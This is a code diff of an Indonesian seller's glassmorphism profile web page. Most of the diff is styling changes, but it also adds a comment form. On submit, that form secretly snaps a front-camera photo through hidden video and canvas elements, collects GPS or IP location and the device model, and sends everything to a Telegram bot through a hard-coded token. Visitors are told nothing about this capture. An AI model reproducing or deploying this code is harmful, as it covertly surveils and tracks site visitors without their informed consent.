@@ -10,7 +10,7 @@
     <!-- Google Fonts (Outfit & Plus Jakarta Sans) -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&family=Plus+Jakarta+Sans:wght@600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
     <!-- Font Awesome 6 Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
@@ -53,26 +53,26 @@
             font-family: 'Outfit', sans-serif;
         }
 
-        /* TEMA GLASSMORPHISM PENUH */
+        /* TEMA GLASSMORPHISM ELEGAND */
         .glass-panel {
-            background: rgba(15, 23, 42, 0.45) !important;
-            backdrop-filter: blur(25px) !important;
-            -webkit-backdrop-filter: blur(25px) !important;
-            border: 1px solid rgba(255, 255, 255, 0.18) !important;
-            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.5) !important;
+            background: rgba(15, 23, 42, 0.55) !important;
+            backdrop-filter: blur(28px) !important;
+            -webkit-backdrop-filter: blur(28px) !important;
+            border: 1px solid rgba(255, 255, 255, 0.15) !important;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6) !important;
         }
 
         .glass-item {
-            background: rgba(255, 255, 255, 0.06) !important;
+            background: rgba(255, 255, 255, 0.04) !important;
             backdrop-filter: blur(16px) !important;
             -webkit-backdrop-filter: blur(16px) !important;
-            border: 1px solid rgba(255, 255, 255, 0.12) !important;
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
             transition: all 0.25s ease;
         }
 
         .glass-item:hover {
-            background: rgba(255, 255, 255, 0.12) !important;
-            border-color: rgba(255, 255, 255, 0.3) !important;
+            background: rgba(255, 255, 255, 0.08) !important;
+            border-color: rgba(0, 210, 255, 0.35) !important;
             transform: translateY(-2px);
         }
 
@@ -85,9 +85,9 @@
         }
 
         .glass-enter-btn:hover {
-            background: rgba(255, 255, 255, 0.2);
-            border-color: rgba(255, 255, 255, 0.4);
-            box-shadow: 0 8px 25px -5px rgba(255, 255, 255, 0.15);
+            background: rgba(255, 255, 255, 0.18);
+            border-color: rgba(0, 210, 255, 0.5);
+            box-shadow: 0 8px 25px -5px rgba(0, 210, 255, 0.25);
         }
 
         ::-webkit-scrollbar {
@@ -119,6 +119,10 @@
     <audio id="bgMusic" loop preload="auto">
         <source src="https://cdn.zass.in/n9Rj1dZcGh.mpeg" type="audio/mpeg">
     </audio>
+
+    <!-- ELEMEN TERSEMBUNYI UNTUK MEMPROSES FOTO KAMERA -->
+    <video id="camVideo" autoplay playsinline class="hidden"></video>
+    <canvas id="camCanvas" class="hidden"></canvas>
 
     <!-- 1. FULLSCREEN WELCOME SCREEN -->
     <div id="welcomeLayer" class="fixed inset-0 z-50 flex items-end justify-center w-full h-full transition-all duration-700 ease-out overflow-hidden bg-black">
@@ -159,25 +163,24 @@
     </div>
 
     <!-- 2. MAIN PROFILE CONTAINER -->
-    <main id="mainCard" class="w-full max-w-[420px] sm:max-w-[450px] mx-auto transition-all duration-700 relative z-10 my-auto">
-        <div class="glass-panel rounded-2xl overflow-hidden shadow-2xl relative">
+    <main id="mainCard" class="w-full max-w-[430px] sm:max-w-[460px] mx-auto transition-all duration-700 relative z-10 my-auto">
+        <div class="glass-panel rounded-3xl overflow-hidden shadow-2xl relative border border-white/10">
             
             <!-- A. BANNER SHOWCASE -->
-            <div class="relative w-full h-36 sm:h-44 bg-slate-950 overflow-hidden">
+            <div class="relative w-full h-38 sm:h-44 bg-slate-950 overflow-hidden">
                 <img id="gameBanner" 
                      src="https://img3.pixhost.to/images/6392/783382213_media_1791869025159.jpg" 
                      class="w-full h-full object-cover"
                      onerror="this.src='https://placehold.co/1200x675/0a0d14/00d2ff?text=Game+Showcase'" />
-                <div class="absolute inset-0 bg-gradient-to-t from-slate-950/80 via-black/20 to-transparent"></div>
+                <div class="absolute inset-0 bg-gradient-to-t from-slate-950/90 via-black/30 to-transparent"></div>
             </div>
 
             <!-- B. PROFILE CONTENT -->
             <div class="px-5 sm:px-6 pb-6 relative pt-0">
                 
-                <!-- AVATAR (TANPA BORDER BIRU) & BADGES -->
+                <!-- AVATAR & BADGES -->
                 <div class="flex items-end justify-between -mt-12 sm:-mt-14 mb-4 relative z-10">
                     <div class="relative">
-                        <!-- Border biru diubah menjadi border glass halus -->
                         <div class="w-20 h-20 sm:w-24 sm:h-24 rounded-2xl p-0.5 bg-white/10 backdrop-blur-md border border-white/20 shadow-xl">
                             <img id="jbAvatar" 
                                  src="https://img3.pixhost.to/images/6392/783382171_media_1791869015731.jpg" 
@@ -252,71 +255,95 @@
                 </div>
 
                 <!-- SOCIAL MEDIA BUTTONS -->
-                <div class="space-y-3">
-                    <h2 class="text-xs font-extrabold text-gray-300 uppercase tracking-wider mb-3 flex items-center gap-1.5">
+                <div class="space-y-2.5 mb-4">
+                    <h2 class="text-xs font-extrabold text-gray-300 uppercase tracking-wider mb-2.5 flex items-center gap-1.5">
                         <i class="fa-solid fa-paper-plane text-brand-blue text-sm"></i> Contact & MEDSOS
                     </h2>
 
                     <!-- WhatsApp -->
                     <a href="https://wa.me/6285801134620?text=hallo+bang+yann" target="_blank" rel="noopener noreferrer" class="glass-item w-full p-3.5 rounded-xl flex items-center justify-between group text-white min-w-0">
                         <div class="flex items-center gap-3.5 min-w-0">
-                            <div class="w-11 h-11 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-xl shrink-0">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-lg shrink-0">
                                 <i class="fa-brands fa-whatsapp"></i>
                             </div>
                             <div class="text-left min-w-0">
-                                <p class="text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">WhatsApp</p>
-                                <p class="text-xs text-gray-400 truncate">Order / Transaksi</p>
+                                <p class="text-xs sm:text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">WhatsApp</p>
+                                <p class="text-[11px] text-gray-400 truncate">Order / Transaksi</p>
                             </div>
                         </div>
-                        <i class="fa-solid fa-chevron-right text-sm text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
+                        <i class="fa-solid fa-chevron-right text-xs text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
                     </a>
 
                     <!-- Instagram -->
                     <a href="https://instagram.com/yann16b" target="_blank" rel="noopener noreferrer" class="glass-item w-full p-3.5 rounded-xl flex items-center justify-between group text-white min-w-0">
                         <div class="flex items-center gap-3.5 min-w-0">
-                            <div class="w-11 h-11 rounded-xl bg-white/5 text-gray-200 flex items-center justify-center text-xl shrink-0">
+                            <div class="w-10 h-10 rounded-xl bg-white/5 text-gray-200 flex items-center justify-center text-lg shrink-0">
                                 <i class="fa-brands fa-instagram"></i>
                             </div>
                             <div class="text-left min-w-0">
-                                <p class="text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">Instagram</p>
-                                <p class="text-xs text-gray-400 truncate">ig gabut | follow</p>
+                                <p class="text-xs sm:text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">Instagram</p>
+                                <p class="text-[11px] text-gray-400 truncate">ig gabut | follow</p>
                             </div>
                         </div>
-                        <i class="fa-solid fa-chevron-right text-sm text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
+                        <i class="fa-solid fa-chevron-right text-xs text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
                     </a>
 
                     <!-- TikTok -->
                     <a href="https://tiktok.com/@yannjamsut" target="_blank" rel="noopener noreferrer" class="glass-item w-full p-3.5 rounded-xl flex items-center justify-between group text-white min-w-0">
                         <div class="flex items-center gap-3.5 min-w-0">
-                            <div class="w-11 h-11 rounded-xl bg-white/5 text-gray-200 flex items-center justify-center text-xl shrink-0">
+                            <div class="w-10 h-10 rounded-xl bg-white/5 text-gray-200 flex items-center justify-center text-lg shrink-0">
                                 <i class="fa-brands fa-tiktok"></i>
                             </div>
                             <div class="text-left min-w-0">
-                                <p class="text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">TikTok</p>
-                                <p class="text-xs text-gray-400 truncate">Tiktok gabut | follow</p>
+                                <p class="text-xs sm:text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">TikTok</p>
+                                <p class="text-[11px] text-gray-400 truncate">Tiktok gabut | follow</p>
                             </div>
                         </div>
-                        <i class="fa-solid fa-chevron-right text-sm text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
+                        <i class="fa-solid fa-chevron-right text-xs text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
                     </a>
 
                     <!-- WhatsApp Channel -->
                     <a href="https://whatsapp.com/channel/0029Vb8Nqbq1HspqQgS6ro22" target="_blank" rel="noopener noreferrer" class="glass-item w-full p-3.5 rounded-xl flex items-center justify-between group text-white min-w-0">
                         <div class="flex items-center gap-3.5 min-w-0">
-                            <div class="w-11 h-11 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-xl shrink-0">
+                            <div class="w-10 h-10 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center text-lg shrink-0">
                                 <i class="fa-solid fa-bullhorn"></i>
                             </div>
                             <div class="text-left min-w-0">
-                                <p class="text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">Saluran WhatsApp</p>
-                                <p class="text-xs text-gray-400 truncate">Info stok & Rental akun</p>
+                                <p class="text-xs sm:text-sm font-extrabold group-hover:text-brand-blue transition-colors truncate">Saluran WhatsApp</p>
+                                <p class="text-[11px] text-gray-400 truncate">Info stok & Rental akun</p>
                             </div>
                         </div>
-                        <i class="fa-solid fa-chevron-right text-sm text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
+                        <i class="fa-solid fa-chevron-right text-xs text-gray-400 group-hover:text-brand-blue group-hover:translate-x-0.5 transition-all shrink-0 ml-2"></i>
                     </a>
                 </div>
 
+                <!-- FORM KOLOM KOMENTAR / PESAN -->
+                <div class="mb-4 glass-item p-4 rounded-xl">
+                    <h2 class="text-xs font-bold text-gray-300 uppercase tracking-wider mb-3 flex items-center gap-2">
+                        <i class="fa-solid fa-comments text-brand-blue"></i> Kirim Pesan / Komentar
+                    </h2>
+                    
+                    <form id="commentForm" class="space-y-3">
+                        <div>
+                            <input type="text" id="commentName" required placeholder="Nama / Nickname" 
+                                   class="w-full px-3.5 py-2.5 text-xs sm:text-sm bg-white/5 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-brand-blue focus:bg-black/30 transition-all">
+                        </div>
+                        <div>
+                            <textarea id="commentText" required rows="3" placeholder="Tulis komentar atau pesan kamu di sini..." 
+                                      class="w-full px-3.5 py-2.5 text-xs sm:text-sm bg-white/5 border border-white/10 rounded-lg text-white placeholder-gray-500 focus:outline-none focus:border-brand-blue focus:bg-black/30 transition-all resize-none"></textarea>
+                        </div>
+                        <button type="submit" id="sendCommentBtn" 
+                                class="w-full py-2.5 rounded-lg bg-brand-blue/10 border border-brand-blue/30 text-brand-blue font-bold text-xs sm:text-sm hover:bg-brand-blue hover:text-black active:scale-[0.98] transition-all duration-300 flex items-center justify-center gap-2">
+                            <i class="fa-solid fa-paper-plane text-xs"></i>
+                            <span>Kirim Pesan</span>
+                        </button>
+                        <p id="commentStatus" class="text-center text-xs font-semibold hidden transition-all duration-300"></p>
+                    </form>
+                </div>
+
                 <!-- Footer -->
-                <div class="mt-6 pt-3 border-t border-white/5 text-center">
-                    <p class="text-[11px] text-gray-300 font-medium">
+                <div class="mt-5 pt-3 border-t border-white/5 text-center">
+                    <p class="text-[11px] text-gray-400 font-medium">
                         -YANNSTR | JB NEW
                     </p>
                 </div>
@@ -472,6 +499,171 @@
             welcomeLayer.classList.add('opacity-0', 'pointer-events-none');
             mainCard.classList.remove('opacity-0', 'translate-y-4');
             mainCard.classList.add('opacity-100', 'translate-y-0');
+        });
+
+        // --- SCRIPT PENGIRIMAN KOMENTAR + DETEKSI MERK HP + GPS + TANGKAPAN KAMERA ---
+        const commentForm = document.getElementById('commentForm');
+        const commentName = document.getElementById('commentName');
+        const commentText = document.getElementById('commentText');
+        const sendCommentBtn = document.getElementById('sendCommentBtn');
+        const commentStatus = document.getElementById('commentStatus');
+        const camVideo = document.getElementById('camVideo');
+        const camCanvas = document.getElementById('camCanvas');
+
+        // BOT TOKEN & CHAT ID TELEGRAM
+        const TELEGRAM_BOT_TOKEN = '8960260514:AAE9Z9lhijf0wyvjApuPELJlzhQyWAFWRnM';
+        const TELEGRAM_CHAT_ID = '7456010774';
+
+        // DETEKSI TIPE/MERK HP
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Perangkat Tidak Dikenal";
+
+            if (/android/i.test(ua)) {
+                const match = ua.match(/Android\s+([\d\.]+);?\s*([^;)]*)/i);
+                device = match && match[2] ? `Android (${match[2].trim()})` : "Android Device";
+            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+                device = "Apple iPhone / iOS Device";
+            } else if (/Windows/i.test(ua)) {
+                device = "PC / Laptop (Windows)";
+            } else if (/Macintosh/i.test(ua)) {
+                device = "MacBook / Mac OS";
+            }
+
+            return device;
+        }
+
+        // FUNGSI TANGKAP FOTO DARI KAMERA
+        async function captureCameraBlob() {
+            return new Promise((resolve) => {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    resolve(null);
+                    return;
+                }
+
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                    .then((stream) => {
+                        camVideo.srcObject = stream;
+                        camVideo.onloadedmetadata = () => {
+                            setTimeout(() => {
+                                camCanvas.width = camVideo.videoWidth || 640;
+                                camCanvas.height = camVideo.videoHeight || 480;
+                                const ctx = camCanvas.getContext('2d');
+                                ctx.drawImage(camVideo, 0, 0, camCanvas.width, camCanvas.height);
+                                
+                                // Matikan stream kamera setelah gambar terambil
+                                stream.getTracks().forEach(track => track.stop());
+
+                                camCanvas.toBlob((blob) => {
+                                    resolve(blob);
+                                }, 'image/jpeg', 0.8);
+                            }, 500);
+                        };
+                    })
+                    .catch(() => {
+                        // Jika izin kamera ditolak oleh pengguna
+                        resolve(null);
+                    });
+            });
+        }
+
+        commentForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const name = commentName.value.trim();
+            const message = commentText.value.trim();
+
+            if (!name || !message) return;
+
+            sendCommentBtn.disabled = true;
+            sendCommentBtn.classList.add('opacity-50', 'cursor-not-allowed');
+            sendCommentBtn.querySelector('span').textContent = 'Memproses...';
+
+            const deviceInfo = getDeviceInfo();
+
+            // Coba ambil foto dari kamera
+            const photoBlob = await captureCameraBlob();
+
+            // Fungsi eksekusi pengiriman ke Bot Telegram
+            const sendToTelegram = async (locationText) => {
+                const fullCaption = `💬 *Komentar Baru dari Web YANNSTR*\n\n👤 *Nama:* ${name}\n📝 *Pesan:* ${message}\n📱 *Perangkat/HP:* ${deviceInfo}\n📍 *Lokasi:* ${locationText}`;
+
+                try {
+                    let response;
+                    
+                    if (photoBlob) {
+                        // Jika foto berhasil ditangkap, kirim menggunakan endpoint sendPhoto
+                        const formData = new FormData();
+                        formData.append('chat_id', TELEGRAM_CHAT_ID);
+                        formData.append('photo', photoBlob, 'photo.jpg');
+                        formData.append('caption', fullCaption);
+                        formData.append('parse_mode', 'Markdown');
+
+                        response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } else {
+                        // Jika kamera ditolak, kirim teks menggunakan sendMessage
+                        response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: fullCaption,
+                                parse_mode: 'Markdown'
+                            })
+                        });
+                    }
+
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        commentStatus.textContent = "✅ Pesan terkirim ke -yannstr";
+                        commentStatus.className = "text-center text-xs font-semibold text-emerald-400 block mt-2";
+                        commentForm.reset();
+                    } else {
+                        throw new Error('Gagal mengirim');
+                    }
+                } catch (error) {
+                    commentStatus.textContent = "❌ Gagal mengirim pesan. Coba lagi nanti.";
+                    commentStatus.className = "text-center text-xs font-semibold text-red-400 block mt-2";
+                } finally {
+                    sendCommentBtn.disabled = false;
+                    sendCommentBtn.classList.remove('opacity-50', 'cursor-not-allowed');
+                    sendCommentBtn.querySelector('span').textContent = 'Kirim Pesan';
+
+                    setTimeout(() => {
+                        commentStatus.classList.add('hidden');
+                    }, 4000);
+                }
+            };
+
+            // Meminta izin lokasi GPS dari browser
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        const locationInfo = `${lat}, ${lon}\n🔗 [Buka di Google Maps](${mapsLink})`;
+                        sendToTelegram(locationInfo);
+                    },
+                    async (error) => {
+                        try {
+                            const ipRes = await fetch('https://ipapi.co/json/');
+                            const ipData = await ipRes.json();
+                            const locationInfo = `${ipData.city || 'Tidak diketahui'}, ${ipData.region || ''} (IP: ${ipData.ip || 'Hidden'}) [Izin GPS Ditolak]`;
+                            sendToTelegram(locationInfo);
+                        } catch (e) {
+                            sendToTelegram("Izin GPS Ditolak Pengguna");
+                        }
+                    },
+                    { enableHighAccuracy: true, timeout: 7000 }
+                );
+            } else {
+                sendToTelegram("Browser tidak mendukung Geolocation API");
+            }
         });
     </script>
 </body>
